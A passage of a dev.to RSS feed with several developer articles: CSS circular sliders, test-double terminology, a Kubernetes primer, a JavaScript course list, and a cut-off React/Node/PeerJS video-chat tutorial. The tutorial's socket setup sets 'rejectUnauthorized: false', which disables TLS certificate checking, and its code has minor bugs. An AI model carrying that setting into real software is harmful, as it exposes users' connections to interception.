&lt;p&gt;I created these sliders recently, using only CSS:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--dcLJx0B8--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/g2vuni0i6ngt8jnlzip4.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--dcLJx0B8--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/g2vuni0i6ngt8jnlzip4.png" alt="Range Sliders"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;JavaScript is only used to set the &lt;code&gt;value&lt;/code&gt; of the slider as a &lt;em&gt;custom property&lt;/em&gt;, that then is used in a CSS &lt;code&gt;linear-gradient&lt;/code&gt; to create the "fill".&lt;/p&gt;

&lt;p&gt;Accessibility is "built-in": you can &lt;code&gt;:focus&lt;/code&gt;, and use &lt;code&gt;arrow&lt;/code&gt;-keys for navigation.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#but-what-about-circular-sliders" class="anchor"&gt;
  &lt;/a&gt;
  But what about &lt;em&gt;Circular Sliders?&lt;/em&gt;
&lt;/h2&gt;

&lt;p&gt;I've always had a soft spot for circular sliders — don't know why, really. So I tried to style the &lt;code&gt;&amp;lt;input type="range" /&amp;gt;&lt;/code&gt; as a circle, and the &lt;code&gt;thumb&lt;/code&gt;-shadow-element as a draggable, smaller circle.&lt;/p&gt;

&lt;p&gt;Visually, it was possible using only CSS:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--GsazVfwB--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/a4r7yl2hv1fjemlsxbwo.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--GsazVfwB--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/a4r7yl2hv1fjemlsxbwo.png" alt="Circular Range"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;But the movement of the thumb-circle was still &lt;em&gt;horizontal&lt;/em&gt;. &lt;br&gt;
I then tried to update a custom property with the &lt;code&gt;value&lt;/code&gt; of the &lt;code&gt;&amp;lt;input&amp;gt;&lt;/code&gt;, and used that in a &lt;code&gt;transform&lt;/code&gt;, rotating the &lt;code&gt;track&lt;/code&gt; of the &lt;code&gt;&amp;lt;input&amp;gt;&lt;/code&gt; and a negative &lt;code&gt;margin-left&lt;/code&gt; to position the thumb.&lt;/p&gt;

&lt;p&gt;But, alas, although it &lt;em&gt;was&lt;/em&gt; possible to move the thumb along the edges of the circle using arrow-keys, it didn't really work using pointer-devices.&lt;/p&gt;

&lt;p&gt;So in the end, I had to call my father, a retired maths teacher, to brush up my trigonometry and understanding of arctangents, in order to create these accessible, circular sliders:&lt;/p&gt;

&lt;p&gt;&lt;iframe height="600" src="https://codepen.io/stoumann/embed/mdrEEMw?height=600&amp;amp;default-tab=result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;They are &lt;code&gt;:focus&lt;/code&gt;'able, and use the same &lt;code&gt;arrow&lt;/code&gt;-keys as regular range-sliders. The &lt;code&gt;fill&lt;/code&gt; is a CSS &lt;code&gt;conic-gradient&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;

</description>
      <category>css</category>
      <category>javascript</category>
      <category>a11y</category>
      <category>codepen</category>
    </item>
    <item>
      <title>Test doubles: dummies, stubs, mocks, fakes</title>
      <author>le0nidas</author>
      <pubDate>Sat, 02 Jan 2021 16:19:52 +0000</pubDate>
      <link>https://dev.to/le0nidas/test-doubles-dummies-stubs-mocks-fakes-3c18</link>
      <guid>https://dev.to/le0nidas/test-doubles-dummies-stubs-mocks-fakes-3c18</guid>
      <description>&lt;p&gt;While testing we tend to replace some of the unit’s collaborators with &lt;em&gt;mocks&lt;/em&gt; as it is accustomed to call them. The problem with that name is that it is not accurate. The real name of those mocks is &lt;code&gt;test doubles&lt;/code&gt; and there are four of them with mock being one of the types.&lt;/p&gt;

&lt;p&gt;One reason for this misnaming is the wide usage of mocking frameworks that do not separate the types between them (I am looking at you &lt;a href="https://site.mockito.org/"&gt;mockito&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;So, lets try to define the four types and see when it is best to use them. We will be using a made up browser and its history and will not use any framework. Just theory:&lt;/p&gt;


&lt;div class="ltag_gist-liquid-tag"&gt;
  
&lt;/div&gt;


&lt;h4&gt;
  &lt;a href="#dummies" class="anchor"&gt;
  &lt;/a&gt;
  Dummies
&lt;/h4&gt;

&lt;p&gt;A &lt;code&gt;dummy&lt;/code&gt; is the test double that we use whenever we know that the collaborator will not be used:&lt;/p&gt;


&lt;div class="ltag_gist-liquid-tag"&gt;
  
&lt;/div&gt;


&lt;p&gt;For example in the tests above we just need to check the browser’s active URL. We know that this does not evolve the browser’s history so we pass a collaborator that does nothing on every method call.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#stubs" class="anchor"&gt;
  &lt;/a&gt;
  Stubs
&lt;/h4&gt;

&lt;p&gt;A &lt;code&gt;stub&lt;/code&gt; is the test double that we use whenever the collaborator is being used to query values:&lt;/p&gt;


&lt;div class="ltag_gist-liquid-tag"&gt;
  
&lt;/div&gt;


&lt;p&gt;For example in the test above we feed the browser with a pre-populated history since we know that the browser will need to peek for the last visited URL.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#mocks" class="anchor"&gt;
  &lt;/a&gt;
  Mocks
&lt;/h4&gt;

&lt;p&gt;A &lt;code&gt;mock&lt;/code&gt; is the test double that we use whenever the collaborator is being used to perform an action:&lt;/p&gt;


&lt;div class="ltag_gist-liquid-tag"&gt;
  
&lt;/div&gt;


&lt;p&gt;For example in the test above we need to make sure that the browser saves the provided URL to its history so we use a collaborator that can verify this behavior.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#fakes" class="anchor"&gt;
  &lt;/a&gt;
  Fakes
&lt;/h4&gt;

&lt;p&gt;A &lt;code&gt;fake&lt;/code&gt; is the test double that we use whenever we need the collaborator to provide us a usable business logic:&lt;/p&gt;


&lt;div class="ltag_gist-liquid-tag"&gt;
  
&lt;/div&gt;


&lt;p&gt;For example in the test above we need a history instance that works as expected (a simple stack) but without the hassle of having a database or using the file system.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#final-thoughts" class="anchor"&gt;
  &lt;/a&gt;
  Final thoughts
&lt;/h4&gt;

&lt;p&gt;Having your own test doubles per case makes the code simpler and more readable but does that mean that we should remove our mocking frameworks? In my opinion no. Having a framework saves you a lot of time and keeps things consistent, especially in big projects with lots of developers.&lt;/p&gt;

&lt;p&gt;Knowing the theory behind something is always good since it lays a common foundation for discussions and decisions. A mix of the two, framework and theory, could be achieved and help the test code in readability.&lt;br&gt;&lt;br&gt;
For example, we can keep using &lt;a href="https://javadoc.io/doc/org.mockito/mockito-core/latest/org/mockito/Mockito.html#mock-java.lang.Class-"&gt;Mockito’s mock&lt;/a&gt; but name the variable &lt;code&gt;stubBlahBlah&lt;/code&gt; if is used as a stub. This way the reader will know what to expect.&lt;/p&gt;

&lt;p&gt;PS #1: &lt;a href="http://spockframework.org/"&gt;Spock&lt;/a&gt; testing framework, besides being a great tool, provides a way to separate stubs from mocks not just in semantics but in usage too (ex: you cannot verify something when using a stub)&lt;/p&gt;

&lt;p&gt;PS #2: There is another type of test double called &lt;code&gt;Spy&lt;/code&gt; which is a toned down mock that helps in keeping state when a certain behavior takes place but does not verify it.&lt;/p&gt;

</description>
      <category>testing</category>
      <category>dummy</category>
      <category>fake</category>
      <category>mock</category>
    </item>
    <item>
      <title>Introduction To Kubernetes</title>
      <author>Arsh Sharma</author>
      <pubDate>Sat, 02 Jan 2021 13:10:47 +0000</pubDate>
      <link>https://dev.to/rinkiyakedad/introduction-to-kubernetes-55o7</link>
      <guid>https://dev.to/rinkiyakedad/introduction-to-kubernetes-55o7</guid>
      <description>&lt;p&gt;Let's be honest, Kubernetes is &lt;del&gt;Cool&lt;/del&gt; Kool. And to introduce you to its coolness I've started this series. We'll start this one too like the &lt;a href="https://dev.to/rinkiyakedad/series/10009"&gt;Docker series&lt;/a&gt; by first answering the "why" and then have a look at "what" Kubernetes (also called K8s) is and explore a bit of its architecture.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;If you're not familiar with the concept of containerization you might want to read &lt;a href="https://dev.to/rinkiyakedad/introduction-to-docker-1hp2"&gt;this&lt;/a&gt; post first.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Let's begin!&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#why-kubernetes" class="anchor"&gt;
  &lt;/a&gt;
  "Why" Kubernetes?
&lt;/h2&gt;

&lt;p&gt;To answer "why" K8s exists you will have to understand a bit about how deployment with containers work. &lt;/p&gt;

&lt;p&gt;The simplest way to understand that is to imagine your containers running on computers present "somewhere". This "somewhere" is generally referred to as "the cloud" and services like AWS, Azure, and Google Cloud simply provide you access to these computers. These computers can be best thought of as our own remote hosting machines where we can install Docker and run containers. Simple as that.&lt;/p&gt;

&lt;p&gt;Now there are a few problems with this way:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;The containers you run might shut down and will need to be replaced.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;If there is greater traffic you might need to spin up more containers.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;You might also want to ensure that only one container isn't doing the heavy lifting and that the load is equally distributed amongst all running instances.&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;It is all these problems that K8s aims to solve. For those of you who're aware of services like &lt;a href="https://aws.amazon.com/ecs"&gt;AWS ECS&lt;/a&gt; might argue that they play a similar role so why bother with K8s?&lt;/p&gt;

&lt;p&gt;Yes, you're right in saying that these services can solve this problem but this, in turn, would mean that you would have to learn that particular service and if want to switch to something else in the future then learn that particular new one. So why not familiarize yourself with a standardized way that will work regardless of the provider you chose? &lt;/p&gt;

&lt;p&gt;That is simply why one would prefer K8s over these services.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;You would need some provider-specific setup with Kubernetes too but that would be a lot less than what you would need when not using K8s.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2&gt;
  &lt;a href="#what-is-kubernetes" class="anchor"&gt;
  &lt;/a&gt;
  "What" is Kubernetes?
&lt;/h2&gt;

&lt;p&gt;The &lt;a href="https://kubernetes.io/"&gt;official K8s website&lt;/a&gt; describes Kubernetes as:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Kubernetes, also known as K8s, is an open-source system for automating deployment, scaling, and management of containerized applications.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This explanation should make a lot of sense now after our discussion on "why" K8s. The gist is that it will make our life easy by helping us with deploying containers, scaling them based on the traffic we receive, and overall management of our containerized application.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#kubernetes-core-architecture" class="anchor"&gt;
  &lt;/a&gt;
  Kubernetes Core Architecture
&lt;/h2&gt;

&lt;p&gt;A lot of people when starting with Kubernetes get overwhelmed or confused by the way its architecture works. I will try to simplify this as much as possible here. I do recommend you go check the &lt;a href="https://kubernetes.io/docs/home/"&gt;official documentation&lt;/a&gt; after reading this since here instead of technical accuracy my aim to simplify things so that you can understand the big picture.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Lle5DMVl--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/h5up7m6uitp8ufkr6ty6.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Lle5DMVl--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/h5up7m6uitp8ufkr6ty6.jpg" alt="Untitled Document (1)"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We will analyze this chart from right to left.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#pods" class="anchor"&gt;
  &lt;/a&gt;
  Pods
&lt;/h3&gt;

&lt;p&gt;The rightmost unit in the diagram is a Pod. It can basically be described as the smallest unit in the world of K8s. K8s doesn't run containers directly and uses these "pods" to wrap one or more containers. The containers in a pod share the same resources. The Pods are created and managed by K8s.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;In short: Just imagine a Pod as a wrapper for our container/s.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3&gt;
  &lt;a href="#worker-nodes" class="anchor"&gt;
  &lt;/a&gt;
  Worker Nodes
&lt;/h3&gt;

&lt;p&gt;Like we talked about in the "why" section, a K8s cluster is nothing but a network of computers. The term "Node" can be interpreted as a single computer in this network. There are two kinds of Nodes: Worker and Master.&lt;/p&gt;

&lt;p&gt;Ther Worker Nodes host the pods which run the containers like we talked about above. There can be multiple pods running &lt;strong&gt;different&lt;/strong&gt; containers present in the same worker node. This should not be a surprise because like I already said a Node is just a computer somewhere on the internet (offered by a cloud provider) with a certain amount of CPU and memory and therefore we can, of course, run totally different containers and tasks on it.&lt;/p&gt;

&lt;p&gt;Apart from pods, three important things are present in the Worker Node:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;Docker&lt;/code&gt;: This is a no brainer since we need Docker to run the application containers.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;kubelet&lt;/code&gt;: This can be simply understood as an application that is responsible for communication between the Master and the Worker Nodes.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;kube-proxy&lt;/code&gt;: This can be simplified by understanding its function which is to handle network communications between the pods and network sessions inside or outside the entire K8s cluster.&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;blockquote&gt;
&lt;p&gt;In short: Just imagine a Worker Node as a computer that has the required tools and pods.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3&gt;
  &lt;a href="#the-master-node" class="anchor"&gt;
  &lt;/a&gt;
  The Master Node
&lt;/h3&gt;

&lt;p&gt;The final thing we need to talk about is the Master Node. The master node hosts the "Control Plane" which can be understood as the brain of our K8s cluster. The control plane basically ensures that our K8s cluster is working like we configured it too.&lt;/p&gt;

&lt;p&gt;A few important things running in the master node are:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;API Server: It is the most important service running on the master node and is the counterpart for the &lt;code&gt;kubelet&lt;/code&gt; we talked about above. That is, it is responsible for communication with the worker nodes. &lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Scheduler: It is responsible for watching our pods and choosing the worker nodes on which new pods should be created.&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;And why would we need new pods?&lt;br&gt;
Incase a pod got unhealthy and went down or because of scaling.&lt;/p&gt;

&lt;p&gt;So it is the scheduler that is responsible for telling the API Server "what" to tell the worker nodes. &lt;/p&gt;

&lt;p&gt;There are some other things present too which you can look at in the official docs. But for now, this would suffice.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;In Short: The master node is the brain of our K8s cluster.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2&gt;
  &lt;a href="#conclusion" class="anchor"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h2&gt;

&lt;p&gt;This concludes our introduction to the world of Kubernetes. This article is a part of the second series I plan to write in the coming weeks. I recently finished my &lt;a href="https://dev.to/rinkiyakedad/series/10009"&gt;Demystifying Docker&lt;/a&gt; series where I discussed about docker fundamentals. Reading the previous series isn't a necessity as such but it is highly recommended that you go through it.&lt;/p&gt;

&lt;p&gt;Thanks for reading! :)&lt;/p&gt;

&lt;p&gt;If you have any feedback for me or just want to talk feel free to connect with me on &lt;a href="https://twitter.com/RinkiyaKeDad"&gt;Twitter&lt;/a&gt;. I'll be more than happy to hear from you! :D&lt;/p&gt;

</description>
      <category>tutorial</category>
      <category>beginners</category>
      <category>kubernetes</category>
      <category>devops</category>
    </item>
    <item>
      <title>Top 5 JavaScript Courses for Web Development</title>
      <author>Mohd Danish</author>
      <pubDate>Sat, 02 Jan 2021 12:31:35 +0000</pubDate>
      <link>https://dev.to/mddanishyusuf/top-5-javascript-courses-for-web-development-15i0</link>
      <guid>https://dev.to/mddanishyusuf/top-5-javascript-courses-for-web-development-15i0</guid>
      <description>&lt;p&gt;Hi, my name is Mohd Danish &amp;amp; Founder of &lt;a href="https://nocodeapi.com"&gt;NoCodeAPI&lt;/a&gt;. In this blog post I'm sharing list of courses those I took to brush up my JavaScript Skills. My online favorite teachers are &lt;strong&gt;Wes Bos&lt;/strong&gt;, &lt;strong&gt;Moshfegh Hamedani&lt;/strong&gt;, &amp;amp; &lt;strong&gt;Jonas Schmedtmann&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;There are list of courses:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;a href="https://beginnerjavascript.com/friend/PUBLICAPIS"&gt;Beginner JavaScript&lt;/a&gt; - by Wes Bos&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://codewithmosh.com/p/the-complete-node-js-course"&gt;The Complete Node.js Course&lt;/a&gt; - by Moshfegh Hamedani&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://reactforbeginners.com/friend/PUBLICAPIS"&gt;React for Beginners&lt;/a&gt; - by Wes Bos&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://mastergatsby.com/friend/PUBLICAPIS"&gt;Master Gatsby&lt;/a&gt; - by Wes Bos&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://learnnode.com/friend/PUBLICAPIS"&gt;Learn Node&lt;/a&gt; - by Wes Bos&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://www.udemy.com/course/nodejs-express-mongodb-bootcamp/"&gt;Master Node.js&lt;/a&gt; - by Jonas Schmedtmann&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#beginner-javascript" class="anchor"&gt;
  &lt;/a&gt;
  Beginner JavaScript
&lt;/h3&gt;

&lt;p&gt;A fun, exercise heavy approach to learning Modern JavaScript from scratch. A rock solid understanding of JavaScript is essential for success, no matter which framework you use. This course will give you that.&lt;/p&gt;

&lt;p&gt;JavaScript is hard to learn. Frustration, abandonment and rage quits all stem from trying to use something when we don't understand how things work.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://beginnerjavascript.com/friend/PUBLICAPIS"&gt;Go to course ↗&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#the-complete-nodejs-course" class="anchor"&gt;
  &lt;/a&gt;
  The Complete Node.js Course
&lt;/h3&gt;

&lt;p&gt;Want to learn Node.js, but are tired of wordy and slow instructors who talk to you like you've never coded before? A perfect mix of theory and practice with no waffling. Learn to build RESTful APIs with Node, Express and MongoDB with confidence.&lt;/p&gt;

&lt;p&gt;Includes best practices that pros apply, as well as going over common mistakes that many Node.js developers make.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://codewithmosh.com/p/the-complete-node-js-course"&gt;Go to course ↗&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#react-for-beginners" class="anchor"&gt;
  &lt;/a&gt;
  React for Beginners
&lt;/h3&gt;

&lt;p&gt;A premium step-by-step training course to get you building real world React.js + Firebase apps and website components.&lt;/p&gt;

&lt;p&gt;With a focus on simplicity and readability, this course will have you building real time applications and dynamic website components in no time!&lt;/p&gt;

&lt;p&gt;Together, we will build “Catch of the Day” — a real-time app for a trendy seafood market where price and quantity available are variable and can change at a moment's notice. We will build a menu, an order form, and an inventory management area where authorized users can immediately update product details.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://reactforbeginners.com/friend/PUBLICAPIS"&gt;Go to course ↗&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#master-gatsby" class="anchor"&gt;
  &lt;/a&gt;
  Master Gatsby
&lt;/h3&gt;

&lt;p&gt;Building modern websites is tough. Preloading, routing, compression, critical CSS, caching, scaling and bundlers all make for blazing fast websites, but extra development and tooling get in the way.&lt;/p&gt;

&lt;p&gt;In this course we also write all the CSS to style the website.&lt;/p&gt;

&lt;p&gt;We will learn fun things like CSS Variables, Layouts with Grid (and sub-grid!), Flexbox, clamp(), @supports queries, transforms, scoping CSS, responsive design and so much more!&lt;/p&gt;

&lt;p&gt;I've recorded it in such a way that the CSS videos are skippable, if you rather not learn some CSS along the way.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://mastergatsby.com/friend/PUBLICAPIS"&gt;Go to course ↗&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#learn-node" class="anchor"&gt;
  &lt;/a&gt;
  Learn Node
&lt;/h3&gt;

&lt;p&gt;With a focus on modern JavaScript and real world application, Learn Node is an efficient way to add server side JavaScript to your skill-set and start building the applications you have been dreaming about.&lt;/p&gt;

&lt;p&gt;Together we will build "Now That's Delicious!", a full stack restaurant application which users can search, geolocate, review and curate their favourite restaurants from around the world.&lt;/p&gt;

&lt;p&gt;The application has three main models — Users, Stores and Reviews — all of which are relational. It is designed to hit upon many of today's application needs such as user authentication, database storage, Ajax REST API, file upload and image resizing.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://learnnode.com/friend/PUBLICAPIS"&gt;Go to course ↗&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#master-nodejs" class="anchor"&gt;
  &lt;/a&gt;
  Master Node.js
&lt;/h3&gt;

&lt;p&gt;Master Node by building a real-world RESTful API and web app (with authentication, Node.js security, payments &amp;amp; more)&lt;/p&gt;

&lt;p&gt;Do you want to build fast and powerful back-end applications with JavaScript? Would you like to become a more complete and in-demand developer?&lt;/p&gt;

&lt;p&gt;Then Node.js is the hot technology for you to learn right now, and you came to the right place to do it!&lt;/p&gt;

&lt;p&gt;&lt;a href="https://www.udemy.com/course/nodejs-express-mongodb-bootcamp/"&gt;Go to course ↗&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This is all. Let us know which course you will go to this year.&lt;/p&gt;

&lt;p&gt;Originally Published on &lt;a href="https://public-apis.io/top-javascript-courses-for-web-development"&gt;Public APIs&lt;/a&gt;&lt;/p&gt;

</description>
      <category>javascript</category>
      <category>courses</category>
      <category>webdev</category>
    </item>
    <item>
      <title>Video Chatting and Screen Sharing with React, Node, WebRTC(peerjs)</title>
      <author>Arjhun777</author>
      <pubDate>Sat, 02 Jan 2021 12:23:56 +0000</pubDate>
      <link>https://dev.to/arjhun777/video-chatting-and-screen-sharing-with-react-node-webrtc-peerjs-18fg</link>
      <guid>https://dev.to/arjhun777/video-chatting-and-screen-sharing-with-react-node-webrtc-peerjs-18fg</guid>
      <description>&lt;h4&gt;
  &lt;a href="#to-create-a-video-chatting-and-screen-sharing-application-requires-three-major-setup" class="anchor"&gt;
  &lt;/a&gt;
  To create a video chatting and screen sharing application requires three major setup
&lt;/h4&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Basic React setup for handling UI.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Needs Backend (Nodejs) for maintaining socket connection.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Needs a peer server to maintain create peer-to-peer connection and to maintain it.&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;1) React basic setup with join button which makes an API call to backend and gets a unique id and redirects the user to join the room (React running at the port 3000)&lt;/p&gt;

&lt;p&gt;Frontend - &lt;strong&gt;./Home.js&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;import Axios from 'axios';
import React from 'react';

function Home(props) {
    const handleJoin = () =&amp;gt; {
        Axios.get(`http://localhost:5000/join`).then(res =&amp;gt; {
            props.history?.push(`/join/${res.data.link}? 
           quality=${quality}`);
        })
    }

    return (
        &amp;lt;React.Fragment&amp;gt;
            &amp;lt;button onClick={handleJoin}&amp;gt;join&amp;lt;/button&amp;gt;
        &amp;lt;/React.Fragment&amp;gt;
    )
}

export default Home;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;Here our backend is running at port localhost 5000, as a response will be getting a unique id that will be used as a room id with upcoming steps.&lt;/p&gt;

&lt;p&gt;2) Backend - Node basic setup with a server listening in port 5000 and defining router with "/join" to generate a unique id and return it to frontend&lt;/p&gt;

&lt;p&gt;Backend - &lt;strong&gt;./server.js&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;import express from 'express';
import cors from 'cors';
import server from 'http';
import { v4 as uuidV4 } from 'uuid';

const app = express();
const serve = server.Server(app);
const port = process.env.PORT || 5000;

// Middlewares
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get('/join', (req, res) =&amp;gt; {
    res.send({ link: uuidV4() });
});

serve.listen(port, () =&amp;gt; {
    console.log(`Listening on the port ${port}`);
}).on('error', e =&amp;gt; {
    console.error(e);
});
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;Here using uuid package to generate a unique string.&lt;/p&gt;

&lt;p&gt;3) At the frontend creating a new route with the id got in the response(looks something like this "&lt;a href="http://localhost:3000/join/a7dc3a79-858b-420b-a9c3-55eec5cf199b%22"&gt;http://localhost:3000/join/a7dc3a79-858b-420b-a9c3-55eec5cf199b"&lt;/a&gt;). A new component - RoomComponent is created with the disconnect button and having a div container with id="room-container" to hold our video elements&lt;/p&gt;

&lt;p&gt;Frontend  - &lt;strong&gt;../RoomComponent.js&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;const RoomComponent = (props) =&amp;gt; {
    const handleDisconnect = () =&amp;gt; {
        socketInstance.current?.destoryConnection();
        props.history.push('/');
    }
    return (
        &amp;lt;React.Fragment&amp;gt;
            &amp;lt;div id="room-container"&amp;gt;&amp;lt;/div&amp;gt;
            &amp;lt;button onClick={handleDisconnect}&amp;gt;Disconnect&amp;lt;/button&amp;gt;
        &amp;lt;/React.Fragment&amp;gt;
    )
}

export default RoomComponent;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;4) Now we need our stream from our device cam and mic, we can use the navigator to get the device stream data. For this, we can use a helper class (Connection) to maintain all the incoming and outgoing stream data and to maintain the socket connection with the backend.&lt;/p&gt;

&lt;p&gt;Frontend - &lt;strong&gt;./connection.js&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;import openSocket from 'socket.io-client';
import Peer from 'peerjs';
const { websocket, peerjsEndpoint } = env_config;
const initializePeerConnection = () =&amp;gt; {
    return new Peer('', {
        host: peerjsEndpoint, // need to provide peerjs server endpoint 
                              // (something like localhost:9000)
        secure: true
    });
}
const initializeSocketConnection = () =&amp;gt; {
    return openSocket.connect(websocket, {// need to provide backend server endpoint 
                              // (ws://localhost:5000) if ssl provided then
                              // (wss://localhost:5000) 
        secure: true, 
        reconnection: true, 
        rejectUnauthorized: false,
        reconnectionAttempts: 10
    });
}
class Connection {
    videoContainer = {};
    message = [];
    settings;
    streaming = false;
    myPeer;
    socket;
    myID = '';
    constructor(settings) {
        this.settings = settings;
        this.myPeer = initializePeerConnection();
        this.socket = initializeSocketConnection();
        this.initializeSocketEvents();
        this.initializePeersEvents();
    }
    initializeSocketEvents = () =&amp;gt; {
        this.socket.on('connect', () =&amp;gt; {
            console.log('socket connected');
        });
        this.socket.on('user-disconnected', (userID) =&amp;gt; {
            console.log('user disconnected-- closing peers', userID);
            peers[userID] &amp;amp;&amp;amp; peers[userID].close();
            this.removeVideo(userID);
        });
        this.socket.on('disconnect', () =&amp;gt; {
            console.log('socket disconnected --');
        });
        this.socket.on('error', (err) =&amp;gt; {
            console.log('socket error --', err);
        });
    }
    initializePeersEvents = () =&amp;gt; {
        this.myPeer.on('open', (id) =&amp;gt; {
            this.myID = id;
            const roomID = window.location.pathname.split('/')[2];
            const userData = {
                userID: id, roomID
            }
            console.log('peers established and joined room', userData);
            this.socket.emit('join-room', userData);
            this.setNavigatorToStream();
        });
        this.myPeer.on('error', (err) =&amp;gt; {
            console.log('peer connection error', err);
            this.myPeer.reconnect();
        })
    }
    setNavigatorToStream = () =&amp;gt; {
        this.getVideoAudioStream().then((stream) =&amp;gt; {
            if (stream) {
                this.streaming = true;
